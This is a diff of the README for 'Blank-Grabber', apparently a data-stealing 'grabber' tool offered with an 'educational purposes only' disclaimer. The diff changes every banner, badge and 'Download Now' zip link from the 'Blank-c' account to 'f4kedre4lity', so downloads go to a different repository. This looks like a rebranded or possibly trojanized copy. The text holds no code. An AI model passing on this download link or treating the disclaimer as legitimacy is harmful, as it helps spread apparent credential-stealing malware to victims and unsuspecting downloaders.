@@ -3,17 +3,17 @@
 </h1>
 <p align= "center">
    <kbd>
-   <img  src="https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png">
+   <img  src="https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png">
    </kbd><br><br>
-   <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/forks/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/languages/top/f4kedre4lity/Blank-Grabber">
+   <img src="https://img.shields.io/github/stars/f4kedre4lity/Blank-Grabber">
+   <img src="https://img.shields.io/github/forks/f4kedre4lity/Blank-Grabber">
    <br>
-   <img src="https://img.shields.io/github/last-commit/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/license/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/last-commit/f4kedre4lity/Blank-Grabber">
+   <img src="https://img.shields.io/github/license/f4kedre4lity/Blank-Grabber">
    <br>
-   <img src="https://img.shields.io/github/issues/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/issues-closed/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/issues/f4kedre4lity/Blank-Grabber">
+   <img src="https://img.shields.io/github/issues-closed/f4kedre4lity/Blank-Grabber">
    <br>
    <br>
    <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
@@ -33,7 +33,7 @@
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/f4kedre4lity/Blank-Grabber/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
